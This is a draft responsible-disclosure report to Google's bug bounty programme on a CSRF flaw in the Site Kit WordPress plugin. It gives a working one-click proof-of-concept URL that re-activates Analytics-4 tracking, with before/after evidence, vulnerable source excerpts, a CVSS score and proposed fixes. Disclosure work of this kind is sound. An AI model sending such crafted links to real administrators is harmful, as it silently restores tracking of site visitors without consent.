# Ready-to-send text — Golinks CSRF

Submit through <https://www.google.com/about/appsecurity/> (the channel
`SECURITY.md` names) or the OSS VRP form at bughunters.google.com, project
`google/site-kit-wp`.

**Send only after the duplicate check comes back empty.** Patchstack,
Wordfence Threat Intel, WPScan, and a web search for `"site-kit-wp" golinks
csrf` / `google-site-kit CVE 2026`.

Everything below is written to be pasted as-is. It claims only what the
evidence shows, and it answers the objection the maintainers are most likely
to raise — that golinks are email links and cannot carry a WordPress nonce —
rather than waiting for them to raise it.

---

## Title

Missing CSRF protection on `admin_action_googlesitekit_go` lets one link
re-enable Analytics tracking for every visitor

## Summary

`Golinks::handle_go()` runs on `admin_action_googlesitekit_go` with no nonce
check. One of the handlers it dispatches to is not a redirect: it activates
the Analytics-4 module when the current user holds
`googlesitekit_manage_options`.

So a link on any page, followed by a logged-in administrator, activates the
module on their site. Where Analytics-4 is configured but switched off, that
puts the site's Google Analytics tag back into every public page and
measurement of visitors resumes, with no interaction beyond that one click and
nothing shown to the administrator except a redirect.

I tested this on WordPress 6.9.11 with Site Kit 1.190.0 (commit `8cf47de`),
PHP 8.3.6, on 2026-10-29.

## Steps to reproduce

1. Site Kit set up and connected.
2. Analytics-4 configured with a measurement ID, then deactivated — the state
   a site is in when an administrator turns the module off and keeps its
   settings.
3. Load the site logged out and confirm there is no
   `googletagmanager.com/gtag/js` script.
4. As a logged-in administrator, follow:

   ```
   https://<site>/wp-admin/index.php?action=googlesitekit_go&to=email-report-notice&notice_id=analytics-setup
   ```

   No nonce, no POST, no form.
5. Analytics-4 is active, and a logged-out visitor now receives the gtag
   script and a `gtag("config", "G-…")` call.

WordPress sends no `SameSite` attribute on its auth cookies, so browsers treat
them as `Lax`: they are sent on a top-level navigation like this one and not
on a subresource. The attacker's page therefore needs the administrator to
follow a link — an anchor, a redirect, or `window.location` — so this is one
click rather than zero. An `<img>` tag would not work.

## Evidence

```
starting state: analytics-4 configured (measurement ID G-REPRO) but DEACTIVATED
  googlesitekit_active_modules = ["search-console"]

what a visitor is served BEFORE (no cookies):
  gtag script tags: 0

the request — one GET, no nonce, as a logged-in administrator:
  GET /wp-admin/index.php?action=googlesitekit_go&to=email-report-notice&notice_id=analytics-setup
  HTTP/1.1 302 Found
  Location: …?action=googlesitekit_go&to=connect-analytics-4

  googlesitekit_active_modules = ["search-console","analytics-4"]

what a visitor is served AFTER (no cookies):
  <script src="https://www.googletagmanager.com/gtag/js?id=G-REPRO" id="google_gtagjs-js" async>
  gtag("config", "G-REPRO")
```

Two controls I ran on the same site:

* A Contributor following the same link changes nothing —
  `googlesitekit_active_modules` stays `["search-console"]`. The handler's
  `user_can( …, MANAGE_OPTIONS )` check holds, so the victim has to be an
  administrator.
* Following the link again while the module is already active changes
  nothing; only the notice dismissal runs.

## Where it is

`includes/Core/Golinks/Golinks.php`

```php
const ACTION_GO = 'googlesitekit_go';

public function register() {
    add_action( 'admin_action_' . self::ACTION_GO, array( $this, 'handle_go' ) );
}

public function handle_go() {
    $key = sanitize_key( (string) $this->context->input()->filter( INPUT_GET, 'to', FILTER_DEFAULT ) );
    …
    $destination = $this->handlers[ $key ]->handle( $this->context );
    wp_safe_redirect( $destination );
}
```

No `check_admin_referer()`, and `Golinks::get_url()` puts no nonce in the URL
it builds. `admin_action_*` fires from `wp-admin/admin.php`, which every admin
page includes.

`includes/Core/Email_Reporting/Email_Notice_Golink_Handler.php`

```php
if ( Analytics_Setup_Email_Notice::ID === $notice_id
     && user_can( $user, Permissions::MANAGE_OPTIONS ) ) {
    if ( ! $this->modules->is_module_active( Analytics_4::MODULE_SLUG ) ) {
        $this->modules->activate_module( Analytics_4::MODULE_SLUG );
    }
    …
}
$this->email_notices->dismiss_notice_for_user( $notice_id, $user );
```

`Email_Notices::GOLINK_NOTICE` is `'email-report-notice'`;
`Analytics_Setup_Email_Notice::ID` is `'analytics-setup'`.

The dismissal below it runs for **any logged-in user**, including one with no
Site Kit access at all. A Contributor following the same link ends up with
`email-report-notice-analytics-setup` written to their dismissed prompts:

```
contributor dismissed_prompts BEFORE: (none)
  GET …&to=email-report-notice&notice_id=analytics-setup   as a Contributor
contributor dismissed_prompts AFTER : a:1:{s:35:"email-report-notice-analytics-setup";…}
  active modules: ["search-console"]   (unchanged — the MANAGE_OPTIONS check holds)
```

An unregistered `notice_id` does nothing: `dismiss_notice_for_user()` resolves
it through `get_notice()` and returns early when that is null.

## On the email constraint

I can see that golinks are email CTA links by design —
`Notices/Analytics_Setup_Email_Notice.php:161` builds this URL for the email
body — and that a WordPress nonce is user- and time-bound, so it would not
survive delivery. I am not asking for `wp_create_nonce()` on an emailed link.

What I think is worth changing is that an emailed link is, by construction, a
URL any third party can host, and this one performs a state change that
alters what the site serves to every visitor. Every other state-changing
`admin_action_` in the plugin is protected:

| `admin_action_` handler | verifies a nonce |
|---|---|
| `Setup::handle_action_setup_start` | yes |
| `Setup::handle_action_verify` | yes |
| `Setup::handle_action_exchange_site_code` | yes |
| `Authentication::handle_connect` | yes |
| `Authentication::handle_disconnect` | yes |
| `Sign_In_With_Google::handle_disconnect_user` | yes |
| `Reset::handle_reset_action` | yes |
| **`Golinks::handle_go`** | **no** |

Two fixes keep the email flow working:

* a signed, single-use token in the golink URL — not a WordPress nonce —
  verified in `handle_go()`; or
* a confirmation step before the module is activated, so the GET lands on a
  page rather than performing the change.

`Golinks::get_url()` is the single place these URLs are built, so either one
covers every golink at once.

## What I am not claiming

The attacker does not choose which measurement ID is injected — it is the
site's own, and the settings route that would change it requires
`manage_options` and a nonce. They gain no access and read nothing. On a site
where Analytics-4 was never configured, activating it changes nothing a
visitor sees and the request only dismisses a notice.

CVSS 3.1 `AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N` = 4.3 (Medium).

## Test environment

Local WordPress on SQLite (`sqlite-database-integration` v3.1.2), since the
machine has no MySQL. Site Kit's proxy credentials, a Search Console property
and the module owner's token were written directly, because an OAuth flow
cannot be completed offline. None of them is involved in the missing nonce,
and the Contributor control above shows the capability check still does its
work.

---

## Before sending — the evidence checklist

* [ ] duplicate check run (Patchstack, Wordfence, WPScan, web search) and empty
* [ ] your researcher handle and the date added at the top
* [ ] one screenshot of the terminal showing the before/after, per § 9 — re-run
      `results/oss-vrp/poc/` on the Pi if you want it in your own environment
* [ ] attach or inline `poc/evidence-csrf.txt`
* [ ] send this one on its own. The Site Goals finding is withdrawn as
      Working As Intended; a weak report sent alongside drags the other down
